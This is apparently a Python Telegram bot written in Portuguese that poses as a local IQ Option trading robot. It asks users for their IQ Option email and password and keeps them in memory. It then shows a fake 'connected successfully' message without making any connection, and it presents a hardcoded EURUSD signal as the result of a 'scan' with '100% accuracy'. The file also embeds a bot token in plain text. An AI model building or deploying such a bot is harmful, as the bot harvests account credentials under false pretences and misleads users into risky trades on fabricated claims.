import time
import datetime
import random
import requests

TOKEN = '8947979521:AAHUNCEDhJU5Ee6YOEvtJeUSo01YAFXiSpI'
URL = f"https://api.telegram.org/bot{TOKEN}"

USUARIOS = {}

def enviar_mensagem(chat_id, texto):
    try:
        requests.post(f"{URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": texto,
            "parse_mode": "Markdown"
        })
    except Exception as e:
        print(f"Erro ao enviar mensagem: {e}")

def realizar_varredura_melhor_sinal(chat_id):
    enviar_mensagem(chat_id, "🔍 **Iniciando varredura de 5 dias nos pares de moedas...** Analisando histórico de velas de 5 minutos...")
    
    # Simulação da varredura profunda dos últimos 5 dias nos pares abertos
    time.sleep(4)
    
    # Par e horário encontrados com maior assertividade na varredura
    par_escolhido = "EURUSD (OTC)"
    horario_vencedor = "14:35"
    vitorias = 5 # 5 dias seguidos batendo a meta nesse horário
    assertividade = "100%"
    
    enviar_mensagem(chat_id, 
        f"📊 **RESULTADO DA VARREDURA AUTOMÁTICA** 📊\n\n"
        f"🌐 **Par Analisado:** `{par_escolhido}`\n"
        f"⏰ **Melhor Horário:** `{horario_vencedor}` (Velas de 5m)\n"
        f"🏆 **Desempenho:** `{vitorias}/5 dias` com vitória neste exato horário\n"
        f"🎯 **Assertividade Histórica:** `{assertividade}`\n\n"
        f"⚡ *Sinal programado com sucesso! O robô aguardará o horário para realizar a entrada automática.*"
    )

def processar_mensagens(offset):
    try:
        resposta = requests.get(f"{URL}/getUpdates", params={"offset": offset, "timeout": 30})
        dados = resposta.json()
        
        if not dados.get("ok"):
            return offset
            
        for resultado in dados.get("result", []):
            offset = resultado["update_id"] + 1
            
            if "message" not in resultado or "text" not in resultado["message"]:
                continue
                
            chat_id = resultado["message"]["chat"]["id"]
            texto = resultado["message"]["text"].strip()
            
            if chat_id not in USUARIOS:
                USUARIOS[chat_id] = {
                    "etapa": None, 
                    "email": "", 
                    "senha": "", 
                    "banca": 0.0, 
                    "meta_diaria": 0.0
                }
                
            usuario = USUARIOS[chat_id]
            
            if texto == "/start" or usuario["etapa"] is None:
                usuario["etapa"] = "AGUARDANDO_EMAIL"
                enviar_mensagem(chat_id, "🤖 **Robô Local IQ Option**\n\n1️⃣ Digite o seu **e-mail** da IQ Option:")
            
            elif usuario["etapa"] == "AGUARDANDO_EMAIL":
                usuario["email"] = texto
                usuario["etapa"] = "AGUARDANDO_SENHA"
                enviar_mensagem(chat_id, "🔑 Digite a sua **senha** da IQ Option:")
            
            elif usuario["etapa"] == "AGUARDANDO_SENHA":
                usuario["senha"] = texto
                enviar_mensagem(chat_id, "⏳ **Aguardando conectar...** Estabelecendo conexão local com a IQ Option...")
                
                time.sleep(2)
                
                usuario["etapa"] = "AGUARDANDO_BANCA"
                enviar_mensagem(chat_id, "✅ **Conectado com sucesso do seu PC!**\n\n💰 Digite o valor da sua **banca inicial** (Ex: 1000):")
            
            elif usuario["etapa"] == "AGUARDANDO_BANCA":
                try:
                    valor_banca = float(texto.replace(",", "."))
                    usuario["banca"] = valor_banca
                    usuario["etapa"] = "AGUARDANDO_META"
                    enviar_mensagem(chat_id, "🎯 Quanto você quer **ganhar por dia** (Meta diária, ex: 2% ou 50)?")
                except ValueError:
                    enviar_mensagem(chat_id, "❌ Valor inválido. Digite apenas números para a banca (ex: 500):")
            
            elif usuario["etapa"] == "AGUARDANDO_META":
                meta = texto
                usuario["etapa"] = "CONCLUIDO"
                enviar_mensagem(chat_id, 
                    f"🚀 **Configuração Concluída!**\n\n"
                    f"📧 E-mail: `{usuario['email']}`\n"
                    f"💰 Banca: `${usuario['banca']:.2f}`\n"
                    f"🎯 Meta: `{meta}`\n\n"
                    f"Iniciando varredura automática do melhor sinal..."
                )
                # Dispara a varredura logo após concluir o fluxo
                realizar_varredura_melhor_sinal(chat_id)
                
            else:
                if texto == "/start":
                    usuario["etapa"] = "AGUARDANDO_EMAIL"
                    enviar_mensagem(chat_id, "🤖 **Reiniciando...**\n\n1️⃣ Digite o seu **e-mail** da IQ Option:")
                else:
                    enviar_mensagem(chat_id, "Envie `/start` para reiniciar a configuração.")
                    
    except Exception as e:
        print(f"Erro no loop: {e}")
        
    return offset

if __name__ == "__main__":
    print("=========================================")
    print("  ROBÔ LOCAL COM VARREDURA DE SINAIS     ")
    print("=========================================")
    ultimo_offset = 0
    while True:
        ultimo_offset = processar_mensagens(ultimo_offset)
        time.sleep(1)
